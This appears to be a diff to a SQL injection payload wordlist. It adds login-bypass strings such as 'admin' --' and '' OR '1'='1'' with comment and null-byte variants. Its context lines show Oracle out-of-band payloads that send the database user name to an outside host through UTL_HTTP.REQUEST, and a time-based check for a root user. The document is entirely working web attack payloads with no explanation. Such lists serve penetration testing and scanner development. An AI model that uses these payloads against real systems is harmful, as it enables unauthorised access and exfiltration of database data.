@@ -295,3 +295,17 @@ IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)
 '||UTL_HTTP.REQUEST('http://somehost/')||'
 '||utl_inaddr.get_host_name((select+user+from+dual))
 '+or+1=utl_http.request('http://host/'||(select+user+from+dual))--
+admin' --  
+admin' #  
+admin'/*  
+' or 1=1--  
+' or 1=1#  
+' or 1=1/*  
+') or '1'='1--  
+') or ('1'='1--
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+
+' OR '1'='1' %00
+' OR '1'='1' %16
